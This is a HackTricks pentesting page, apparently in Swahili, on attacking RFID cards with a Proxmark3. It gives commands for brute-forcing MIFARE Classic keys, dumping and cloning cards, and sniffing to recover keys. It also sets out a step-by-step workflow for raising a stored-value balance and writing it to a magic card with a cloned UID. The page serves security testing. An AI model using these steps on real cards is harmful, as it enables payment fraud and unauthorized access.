# Proxmark 3

{{#include ../../banners/hacktricks-training.md}}

## Kushambulia Mfumo za RFID kwa Proxmark3

Kitu cha kwanza unachohitaji kufanya ni kuwa na [**Proxmark3**](https://proxmark.com) na [**install the software and it's dependencie**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux)[**s**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux).

### Kushambulia MIFARE Classic 1KB

Ina **16 sectors**, kila moja yao ina **4 blocks** na kila block ina **16B**. UID iko katika sector 0 block 0 (na haiwezi kubadilishwa).\
Ili kufikia kila sector unahitaji **2 keys** (**A** na **B**) ambazo zimetunzwa katika **block 3 of each sector** (sector trailer). Sector trailer pia inahifadhi **access bits** zinazotoa ruhusa za **read and write** kwenye **each block** zikitumia 2 keys.\
2 keys zinafaa kutoa ruhusa za kusoma ikiwa unajua key ya kwanza, na ruhusa za kuandika ikiwa unajua key ya pili (kwa mfano).

Shambulizi kadhaa zinaweza kufanywa
```bash
proxmark3> hf mf #List attacks

proxmark3> hf mf chk *1 ? t ./client/default_keys.dic #Keys bruteforce
proxmark3> hf mf fchk 1 t # Improved keys BF

proxmark3> hf mf rdbl 0 A FFFFFFFFFFFF # Read block 0 with the key
proxmark3> hf mf rdsc 0 A FFFFFFFFFFFF # Read sector 0 with the key

proxmark3> hf mf dump 1 # Dump the information of the card (using creds inside dumpkeys.bin)
proxmark3> hf mf restore # Copy data to a new card
proxmark3> hf mf eload hf-mf-B46F6F79-data # Simulate card using dump
proxmark3> hf mf sim *1 u 8c61b5b4 # Simulate card using memory

proxmark3> hf mf eset 01 000102030405060708090a0b0c0d0e0f # Write those bytes to block 1
proxmark3> hf mf eget 01 # Read block 1
proxmark3> hf mf wrbl 01 B FFFFFFFFFFFF 000102030405060708090a0b0c0d0e0f # Write to the card
```
The Proxmark3 inaruhusu kufanya vitendo vingine kama **eavesdropping** ya **Tag to Reader communication** ili kujaribu kupata data nyeti. Katika kadi hii unaweza tu sniff mawasiliano na kuhesabu ufunguo uliotumika kwa sababu **cryptographic operations used are weak** na ukijua plain and cipher text unaweza kuuhesabu (`mfkey64` tool).

#### MiFare Classic mtiririko mfupi wa kazi kwa utumiaji mbaya wa thamani iliyohifadhiwa

Wakati terminals zinapohifadhi salio kwenye kadi za Classic, mtiririko wa kawaida kutoka mwanzo hadi mwisho ni:
```bash
# 1) Recover sector keys and dump full card
proxmark3> hf mf autopwn

# 2) Modify dump offline (adjust balance + integrity bytes)
#    Use diffing of before/after top-up dumps to locate fields

# 3) Write modified dump to a UID-changeable ("Chinese magic") tag
proxmark3> hf mf cload -f modified.bin

# 4) Clone original UID so readers recognize the card
proxmark3> hf mf csetuid -u <original_uid>
```
Vidokezo

- `hf mf autopwn` inasimamia nested/darkside/HardNested-style attacks, inapata keys, na huunda dumps katika client dumps folder.
- Kuandika block 0/UID kunaweza kufanya kazi tu kwenye magic gen1a/gen2 cards. Kadi za Classic za kawaida zina UID ya read-only.
- Mipangilio mingi hutumia Classic "value blocks" au simple checksums. Hakikisha kuwa all duplicated/complemented fields na checksums zinabaki zikiwa sawia baada ya uhariri.

Tazama mbinu ya kiwango cha juu na hatua za kuzuia katika:

{{#ref}}
pentesting-rfid.md
{{#endref}}

### Amri Mbichi

Sistimu za IoT wakati mwingine hutumia **tags zisizo za chapa au zisizo za kibiashara**. Katika kesi hii, unaweza kutumia Proxmark3 kutuma **amri mbichi maalum kwa tags**.
```bash
proxmark3> hf search UID : 80 55 4b 6c ATQA : 00 04
SAK : 08 [2]
TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1
proprietary non iso14443-4 card found, RATS not supported
No chinese magic backdoor command detected
Prng detection: WEAK
Valid ISO14443A Tag Found - Quiting Search
```
Kwa taarifa hizi unaweza kujaribu kutafuta taarifa kuhusu kadi na kuhusu jinsi ya kuwasiliana nayo. Proxmark3 inaruhusu kutuma amri ghafi kama: `hf 14a raw -p -b 7 26`

### Skripti

Programu ya Proxmark3 inakuja na orodha iliyopakiwa mapema ya **skripti za otomatiki** ambazo unaweza kutumia kutekeleza kazi rahisi. Ili kupata orodha kamili, tumia amri `script list`. Kisha, tumia amri `script run`, ikifuatiwa na jina la skripti:
```
proxmark3> script run mfkeys
```
Unaweza kuunda script ya **fuzz tag readers**; kwa kunakili data ya **valid card**, andika tu **Lua script** inayofanya **randomize** kwa mmoja au zaidi wa **bytes** za nasibu, kisha angalia ikiwa **reader crashes** kwa mzunguko wowote.

## Marejeo

- [Proxmark3 wiki: HF MIFARE](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Mifare)
- [Proxmark3 wiki: HF Magic cards](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Magic-cards)
- [NXP statement on MIFARE Classic Crypto1](https://www.mifare.net/en/products/chip-card-ics/mifare-classic/security-statement-on-crypto1-implementations/)
- [NFC card vulnerability exploitation in KioSoft Stored Value (SEC Consult)](https://sec-consult.com/vulnerability-lab/advisory/nfc-card-vulnerability-exploitation-leading-to-free-top-up-kiosoft-payment-solution/)

{{#include ../../banners/hacktricks-training.md}}
